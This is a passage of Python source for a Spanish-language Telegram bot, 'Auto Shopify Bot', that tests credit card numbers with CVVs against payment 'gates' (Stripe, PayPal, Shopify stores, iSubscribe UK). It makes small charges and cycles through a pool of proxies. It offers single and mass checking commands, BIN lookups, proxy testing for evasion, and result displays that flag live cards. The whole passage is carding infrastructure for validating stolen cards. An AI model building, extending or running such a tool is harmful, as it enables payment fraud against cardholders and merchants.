    if bin_info and isinstance(bin_info, dict) and 'error' not in bin_info:
        scheme = bin_info.get('scheme', 'UNKNOWN').upper()
        card_type = bin_info.get('type', 'UNKNOWN').upper()
        
        # Datos del país
        country_info = bin_info.get('country', {})
        country_name = country_info.get('name', 'Unknown')
        country_emoji = country_info.get('emoji', '🌍')
        
        # Datos del banco
        bank_info = bin_info.get('bank', {})
        bank_name = bank_info.get('name', 'Unknown')
        
        # Determinar tipo de tarjeta completo
        if scheme == "VISA":
            tipo_completo = "VISA"
        elif scheme == "MASTERCARD":
            tipo_completo = "MASTERCARD"
        elif scheme == "AMEX":
            tipo_completo = "AMERICAN EXPRESS"
        elif scheme == "DISCOVER":
            tipo_completo = "DISCOVER"
        elif scheme == "JCB":
            tipo_completo = "JCB"
        else:
            tipo_completo = scheme
        
        # Tipo específico (debit/credit)
        tipo_especifico = card_type.capitalize() if card_type else "UNKNOWN"
        
        # Información de país formateada
        country_line = f"{country_name} {country_emoji}"
    else:
        tipo_completo = "UNKNOWN"
        tipo_especifico = "UNKNOWN"
        country_line = "Unknown 🌍"
        bank_name = "Unknown"
    
    # Status del proxy
    if resultado_api['proxy'] == 'gestionado':
        proxy_status = "API 🌐"
    else:
        proxy_status = "Live ✨"
    
    # Formatear tiempo
    if tiempo < 60:
        tiempo_str = f"{tiempo:.2f}s"
    else:
        minutos = int(tiempo // 60)
        segundos = int(tiempo % 60)
        tiempo_str = f"{minutos}m {segundos}s"
    
    # Limpiar mensaje de estado
    status_msg = resultado_api['message']
    
    # Construir el mensaje premium
    texto = f"""
{color_estado} {estado_verif}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 : {numero}|{mes}|{año}|{cvv}
[ϟ] 𝗚𝗮𝘁𝗲 : {resultado_api['gate_name']}
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status_msg[:40]}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : {bin_num}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_line}
[ϟ] 𝗕𝗮𝗻𝗸 : {bank_name[:30]}
[ϟ] 𝗧𝘆𝗽𝗲 : {tipo_completo} | {tipo_especifico}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] T/t : {tiempo_str} | Proxy : {proxy_status}
[ϟ] 𝗖𝗵𝗲𝗸𝗲𝗱 𝗯𝘆 : @AutoShopifyBot
[ϟ] 𝗢𝘄𝗻𝗲𝗿 : {user_name}
╚━━━━「𝐀𝐔𝐓𝐎 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐁𝐎𝐓」━━━━╝
"""
    return texto

# ==================== PROXY TESTER ULTRA RÁPIDO ====================

# Semáforo para controlar concurrencia
proxy_semaphore = threading.Semaphore(50)  # Máximo 50 hilos simultáneos

def test_proxy_rapido(proxy):
    """
    Prueba un proxy de manera ultra rápida
    """
    with proxy_semaphore:  # Controlar concurrencia
        try:
            start_time = time.time()
            
            # Parsear proxy
            partes = proxy.split(':')
            if len(partes) == 4:
                ip, puerto, user, passw = partes
                proxy_dict = {
                    'http': f'http://{user}:{passw}@{ip}:{puerto}',
                    'https': f'https://{user}:{passw}@{ip}:{puerto}'
                }
            else:
                proxy_dict = {
                    'http': f'http://{proxy}',
                    'https': f'https://{proxy}'
                }
            
            # Prueba con timeout reducido a 3 segundos
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                timeout=3
            )
            
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                if elapsed < 2:
                    return (proxy, 'alive', f"{elapsed:.2f}s")
                else:
                    return (proxy, 'slow', f"{elapsed:.2f}s")
            else:
                return (proxy, 'dead', f"HTTP {response.status_code}")
                
        except requests.exceptions.ConnectTimeout:
            return (proxy, 'dead', "Timeout")
        except requests.exceptions.ProxyError:
            return (proxy, 'dead', "Proxy Error")
        except Exception as e:
            return (proxy, 'dead', str(e)[:20])

@bot.message_handler(commands=['px', 'pxfast', 'proxytest'])
def cmd_test_proxies_ultra_rapido(message):
    """
    Versión ULTRA RÁPIDA de test de proxies (30-60 segundos para 300 proxies)
    """
    proxies = obtener_proxies()
    total = len(proxies)
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados para testear")
        return
    
    msg = bot.reply_to(message, f"⚡ INICIANDO TEST ULTRA RÁPIDO")
    
    # Mensaje de progreso en tiempo real
    progress_msg = bot.send_message(
        message.chat.id,
        f"📊 Progreso: 0/{total} proxies\n"
        f"⏱️ Tiempo estimado: {total//10} segundos"
    )
    
    resultados = {
        'alive': [],
        'slow': [],
        'dead': []
    }
    
    start_total = time.time()
    procesados = 0
    
    # Usar ThreadPoolExecutor para pruebas en paralelo
    with ThreadPoolExecutor(max_workers=50) as executor:
        # Crear todas las tareas
        future_to_proxy = {executor.submit(test_proxy_rapido, proxy): proxy for proxy in proxies}
        
        # Procesar resultados a medida que se completan
        for future in as_completed(future_to_proxy):
            try:
                proxy, status, info = future.result(timeout=4)
                resultados[status].append((proxy, info))
                
                # Actualizar estado en BD
                actualizar_status_proxy(proxy, status, info)
                
            except Exception as e:
                proxy = future_to_proxy[future]
                resultados['dead'].append((proxy, "Error"))
                actualizar_status_proxy(proxy, 'dead', "Error")
            
            procesados += 1
            
            # Actualizar progreso cada 10 proxies
            if procesados % 10 == 0 or procesados == total:
                elapsed = time.time() - start_total
                porcentaje = (procesados / total) * 100
                barra = "█" * int(porcentaje/5) + "░" * (20 - int(porcentaje/5))
                
                velocidad = procesados / elapsed if elapsed > 0 else 0
                tiempo_restante = (total - procesados) / velocidad if velocidad > 0 else 0
                
                try:
                    bot.edit_message_text(
                        f"⚡ TEST ULTRA RÁPIDO DE PROXIES\n"
                        f"{barra}\n"
                        f"📊 Progreso: {procesados}/{total} ({porcentaje:.1f}%)\n"
                        f"⚡ Velocidad: {velocidad:.1f} proxies/seg\n"
                        f"⏱️ Tiempo restante: {tiempo_restante:.0f} seg\n"
                        f"✅ Vivos: {len(resultados['alive'])}  🐢 Lentos: {len(resultados['slow'])}  ❌ Muertos: {len(resultados['dead'])}",
                        message.chat.id,
                        progress_msg.message_id
                    )
                except:
                    pass
    
    tiempo_total = time.time() - start_total
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    # Mensaje final
    texto_final = f"""✅ TEST ULTRA RÁPIDO COMPLETADO
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS FINALES:

✅ Vivos (<2s): {len(resultados['alive'])}
🐢 Lentos (>2s): {len(resultados['slow'])}
❌ Muertos: {len(resultados['dead'])}
━━━━━━━━━━━━━━━━━━━━━━
⚡ Velocidad: {total/tiempo_total:.1f} proxies/seg
⏱️ Tiempo total: {minutos}m {segundos}s
━━━━━━━━━━━━━━━━━━━━━━
💡 Usa /proxies para ver el estado actualizado"""
    
    try:
        bot.edit_message_text(texto_final, message.chat.id, progress_msg.message_id)
    except:
        bot.send_message(message.chat.id, texto_final)

# ==================== MENÚS Y BOTONES ====================

def menu_principal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 Tarjetas", callback_data='menu_tarjetas')
    btn2 = types.InlineKeyboardButton("🌐 Proxies", callback_data='menu_proxies')
    btn3 = types.InlineKeyboardButton("💵 Stripe $1 No AVS", callback_data='menu_stripe_noavs')
    btn4 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
    btn5 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
    btn6 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
    btn7 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
    btn8 = types.InlineKeyboardButton("🧹 Limpiar sitios", callback_data='clean_sites')
    # NUEVO BOTÓN PARA iSubscribe UK
    btn9 = types.InlineKeyboardButton("🇬🇧 iSubscribe UK", callback_data='menu_isubscribe')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
    return markup

def menu_tarjetas():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Listar tarjetas", callback_data='listar_tarjetas')
    btn2 = types.InlineKeyboardButton("🗑️ Eliminar tarjeta", callback_data='eliminar_tarjeta')
    btn3 = types.InlineKeyboardButton("🧹 Limpiar todas", callback_data='limpiar_tarjetas')
    btn4 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def menu_proxies():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Añadir proxy", callback_data='add_proxy')
    btn2 = types.InlineKeyboardButton("📋 Listar proxies", callback_data='listar_proxies')
    btn3 = types.InlineKeyboardButton("🗑️ Eliminar proxy", callback_data='del_proxy')
    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_proxies')
    btn5 = types.InlineKeyboardButton("🧹 Limpiar muertos", callback_data='clean_dead')
    btn6 = types.InlineKeyboardButton("⚡ Test ultra rápido", callback_data='test_proxies_fast')
    btn7 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    return markup

def menu_paypal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💰 PayPal $10", callback_data='paypal_10')
    btn2 = types.InlineKeyboardButton("🪙 PayPal $0.10", callback_data='paypal_01')
    btn3 = types.InlineKeyboardButton("💎 PayPal $1", callback_data='paypal_1')
    btn4 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def menu_shopify():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Añadir sitio", callback_data='add_sitio')
    btn2 = types.InlineKeyboardButton("📋 Listar sitios", callback_data='listar_sitios')
    btn3 = types.InlineKeyboardButton("🗑️ Eliminar sitio", callback_data='del_sitio')
    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_sitios')
    btn5 = types.InlineKeyboardButton("🔍 Verificar una", callback_data='shopify_individual')
    btn6 = types.InlineKeyboardButton("📦 Verificar masivo", callback_data='shopify_masivo')
    btn7 = types.InlineKeyboardButton("🧹 Limpiar sitios", callback_data='clean_sites')
    btn8 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
    return markup

# ==================== COMANDOS PRINCIPALES ====================

@bot.message_handler(commands=['start', 'menu'])
def cmd_menu(message):
    texto = (
        "╔════════════════════════════╗\n"
        "║    🚀  AUTO SHOPIFY BOT    ║\n"
        "╠════════════════════════════╣\n"
        "║  Gates disponibles:         ║\n"
        "║  • Stripe $1 No AVS         ║\n"
        "║  • PayPal: $10/$0.10/$1    ║\n"
        "║  • AutoShopify             ║\n"
        "║  • iSubscribe UK £4 (NUEVO)║\n"
        "║                            ║\n"
        "║  Proxies:                   ║\n"
        "║  • /px - Test ULTRA RÁPIDO  ║\n"
        "║    (30 seg para 300 proxys) ║\n"
        "║                            ║\n"
        "║  Sitios Shopify:            ║\n"
        "║  • /cleansites - Limpiar    ║\n"
        "║    sitios muertos           ║\n"
        "║                            ║\n"
        "║  Comandos rápidos:          ║\n"
        "║  /check5 CC - Stripe $1    ║\n"
        "║  /pp CC - PayPal $10       ║\n"
        "║  /pp2 CC - PayPal $0.10    ║\n"
        "║  /pp3 CC - PayPal $1       ║\n"
        "║  /sh CC - AutoShopify      ║\n"
        "║  /uk CC - iSubscribe UK £4 ║\n"
        "║  /mass - Stripe masivo     ║\n"
        "║  /mpp - PayPal masivo      ║\n"
        "║  /msh - Shopify masivo     ║\n"
        "║  /muk - iSubscribe masivo  ║\n"
        "╚════════════════════════════╝\n\n"
        "Selecciona una opción:"
    )
    bot.send_message(message.chat.id, texto, reply_markup=menu_principal())

@bot.message_handler(commands=['help'])
def cmd_help(message):
    texto = (
        "╔════════════════════════════╗\n"
        "║        ❓ AYUDA             ║\n"
        "╠════════════════════════════╣\n"
        "║  • Usa los botones para    ║\n"
        "║    navegar por el menú     ║\n"
        "║                            ║\n"
        "║  • Comandos individuales:  ║\n"
        "║    /check5 CC - Stripe $1  ║\n"
        "║    /pp CC - PayPal $10     ║\n"
        "║    /pp2 CC - PayPal $0.10  ║\n"
        "║    /pp3 CC - PayPal $1     ║\n"
        "║    /sh CC - AutoShopify    ║\n"
        "║    /uk CC - iSubscribe UK £4 ║\n"
        "║                            ║\n"
        "║  • Comandos masivos:       ║\n"
        "║    /mass - Stripe masivo   ║\n"
        "║    /mpp - PayPal masivo    ║\n"
        "║    (SOLO $0.10)            ║\n"
        "║    /msh - Shopify masivo   ║\n"
        "║    /muk - iSubscribe masivo║\n"
        "║                            ║\n"
        "║  • Sitios Shopify:          ║\n"
        "║    /addsh URL - Agregar    ║\n"
        "║    /sitios - Listar        ║\n"
        "║    /delsh URL - Eliminar   ║\n"
        "║    /cleansites - Limpiar   ║\n"
        "║      sitios muertos         ║\n"
        "║                            ║\n"
        "║  • Proxies:                 ║\n"
        "║    /px - Test ULTRA RÁPIDO ║\n"
        "║    /proxies - Ver lista     ║\n"
        "║                            ║\n"
        "║  • Otros comandos:         ║\n"
        "║    /bin BIN - Consultar BIN║\n"
        "║    /stats - Estadísticas   ║\n"
        "╚════════════════════════════╝"
    )
    bot.reply_to(message, texto)

@bot.message_handler(commands=['addsh'])
def cmd_add_sitio(message):
    """Agrega un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if guardar_sitio(url):
            bot.reply_to(message, f"✅ Sitio guardado:\n{url}")
        else:
            bot.reply_to(message, "❌ Error: El sitio ya existe o URL inválida")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /addsh https://tienda.myshopify.com")

@bot.message_handler(commands=['sitios'])
def cmd_listar_sitios(message):
    """Lista todos los sitios Shopify"""
    sitios = obtener_sitios_con_estadisticas()
    
    if not sitios:
        bot.send_message(message.chat.id, "📭 No hay sitios guardados")
        return
    
    texto = "╔════════════════════════════╗\n║     🛍️ MIS SITIOS        ║\n╠════════════════════════════╣\n"
    
    for url, succ, fail, last_used in sitios[:10]:
        url_short = url[:25] + "..." if len(url) > 25 else url
        total = succ + fail
        tasa = (succ/total*100) if total > 0 else 0
        
        texto += f"║ {url_short:<28} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 {tasa:.1f}%            ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto, reply_markup=menu_shopify())

@bot.message_handler(commands=['delsh'])
def cmd_del_sitio(message):
    """Elimina un sitio Shopify"""
    try:
        url = message.text.split()[1]
        if eliminar_sitio(url):
            bot.reply_to(message, f"✅ Sitio eliminado: {url[:30]}...")
        else:
            bot.reply_to(message, "❌ Sitio no encontrado")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delsh https://tienda.myshopify.com")

@bot.message_handler(commands=['delallsitios'])
def cmd_del_all_sitios(message):
    """Elimina TODOS los sitios"""
    confirmacion = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
    btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
    confirmacion.add(btn1, btn2)
    
    bot.reply_to(
        message, 
        "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los sitios guardados permanentemente.",
        parse_mode='Markdown',
        reply_markup=confirmacion
    )

@bot.message_handler(commands=['cleansites'])
def cmd_clean_sites(message):
    """Limpia manualmente los sitios que no funcionan"""
    msg = bot.reply_to(message, "🧹 Limpiando sitios muertos...")
    
    try:
        eliminados = limpiar_sitios_muertos()
        sitios_restantes = len(obtener_sitios())
        
        texto = f"""🧹 LIMPIEZA DE SITIOS COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
🗑️ Sitios eliminados: {eliminados}
📌 Sitios restantes: {sitios_restantes}

Los sitios con errores como 'py id empty'
han sido eliminados automáticamente."""
        
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, msg.message_id)

# ==================== COMANDO PARA STRIPE $1 NO AVS ====================

@bot.message_handler(commands=['check5'])
def cmd_check_5(message):
    """Verificar con Stripe $1 No AVS (Gate 5)"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1 No AVS (Gate 5)...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_stripe_noavs(cc, proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_stripe_noavs(cc)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'Stripe $1 No AVS', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Stripe $1 No AVS")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /check5 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== COMANDOS DE VERIFICACIÓN PAYPAL ====================

@bot.message_handler(commands=['pp'])
def cmd_pp(message):
    """Verificar con PayPal $10.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $10.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=1, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=1)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp2'])
def cmd_pp2(message):
    """Verificar con PayPal $0.10"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $0.10...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=2, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=2)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $0.10', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $0.10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp2 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp3'])
def cmd_pp3(message):
    """Verificar con PayPal $1.00"""
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $1.00...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_paypal(cc, gate=3, proxy=proxy)
                if not mejor_resultado or (resultado['status'] == 'success' and mejor_resultado['status'] != 'success'):
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_paypal(cc, gate=3)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], 'PayPal $1', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "PayPal $1")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp3 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== COMANDOS DE VERIFICACIÓN AUTOSHOPIFY ====================

@bot.message_handler(commands=['sh'])
def cmd_shopify(message):
    """Verificar con AutoShopify (NUEVA API)"""
    try:
        partes = message.text.split()
        cc = partes[1]
        
        # Validar formato de tarjeta
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        # Obtener sitios disponibles
        sitios = obtener_sitios()
        
        if not sitios:
            bot.reply_to(message, "❌ No hay sitios guardados. Usa /addsh para agregar uno.")
            return
        
        # Si se proporciona URL específica
        if len(partes) == 3:
            url = partes[2]
            if url not in sitios:
                bot.reply_to(message, "❌ Sitio no encontrado en tu lista")
                return
        else:
            # Seleccionar sitio aleatorio
            url = random.choice(sitios)
        
        numero = cc.split('|')[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, f"🔍 Verificando con AutoShopify (NUEVA API)...\nSitio: {url[:30]}...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxies = obtener_proxies()
        mejor_resultado = None
        
        if proxies:
            for proxy in proxies[:3]:
                resultado = verificar_api_autoshopify(cc, url, proxy)
                if not mejor_resultado or resultado['success']:
                    mejor_resultado = resultado
                time.sleep(1)
        else:
            mejor_resultado = verificar_api_autoshopify(cc, url)
        
        if mejor_resultado:
            guardar_historial(cc, mejor_resultado['proxy'], f"Shopify ${mejor_resultado['amount']}", 
                            mejor_resultado['amount'], mejor_resultado['status'], 
                            mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            # Actualizar estadísticas del sitio
            actualizar_estadisticas_sitio(url, mejor_resultado['success'])
            
            texto_premium = formato_check_premium(cc, mejor_resultado, bin_info, mejor_resultado['tiempo'], user_name, "Shopify")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== NUEVO COMANDO iSubscribe UK ====================

@bot.message_handler(commands=['uk'])
def cmd_uk(message):
    """Verificar con iSubscribe UK (£4.00)"""
    global proxy_actual
    
    try:
        cc = message.text.split()[1]
        
        # Validar formato de tarjeta
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = cc.split('|')[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🇬🇧 Verificando con iSubscribe UK (£4.00)...")
        
        bin_info = consultar_bin(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        resultado = verificar_isubscribe(cc, proxy_actual)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'iSubscribe UK £4', resultado['amount'], 
                            resultado['status'], resultado['message'], 'isubscribe uk', bin_info)
            
            texto_premium = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "iSubscribe UK £4")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /uk NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== VERIFICACIÓN MASIVA STRIPE $1 NO AVS ====================

@bot.message_handler(commands=['mass'])
def cmd_mass_stripe_noavs(message):
    """Verificación masiva con Stripe $1 No AVS (Gate 5)"""
    
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    # Procesar opciones
    texto = message.text.split()
    delay = 2
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    proxies = obtener_proxies()
    if not proxies:
        bot.reply_to(message, "⚠️ Sin proxies - Usando modo gestionado")
    
    task_id = f"mass_noavs_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {
        'chat_id': message.chat.id,
        'cancel': False
    }
    
    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1 NO AVS (GATE 5)
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}
✨ Zero AVS requirement - Maximum efficiency

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_verificacion_masiva_stripe_noavs, 
                   args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_verificacion_masiva_stripe_noavs(task_id, chat_id, delay, notificar_cada):
    """Procesa verificación masiva con Stripe $1 No AVS"""
    
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas guardadas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Stripe $1 No AVS...")
    
    procesadas = 0
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin(card[:6])
        proxies = obtener_proxies()
        
        mejor_resultado = None
        if proxies:
            for proxy in proxies[:2]:
                resultado = verificar_api_stripe_noavs(card, proxy)
                if not mejor_resultado or resultado['status'] == 'success':
                    mejor_resultado = resultado
                time.sleep(0.5)
        else:
            mejor_resultado = verificar_api_stripe_noavs(card)
        
        if mejor_resultado:
            guardar_historial(card, mejor_resultado['proxy'], 'Stripe $1 No AVS', mejor_resultado['amount'], 
                            mejor_resultado['status'], mejor_resultado['message'], mejor_resultado['gates'], bin_info)
            
            if mejor_resultado['status'] == 'success':
                resultados['success'] += 1
                estado_emoji = "✅"
            elif mejor_resultado['status'] == 'failed':
                resultados['failed'] += 1
                estado_emoji = "❌"
            else:
                resultados['error'] += 1
                estado_emoji = "⚠️"
            
            # Guardar detalle
            detalles.append(f"{estado_emoji} {card} | {mejor_resultado['status']} | {mejor_resultado['message'][:50]} | {mejor_resultado['proxy']}")
        else:
            detalles.append(f"❌ {card} | ERROR")
        
        procesadas = i
        
        # Actualizar cada N tarjetas
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%

✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    # Generar archivo de resultados
    tiempo_total = time.time() - start_time
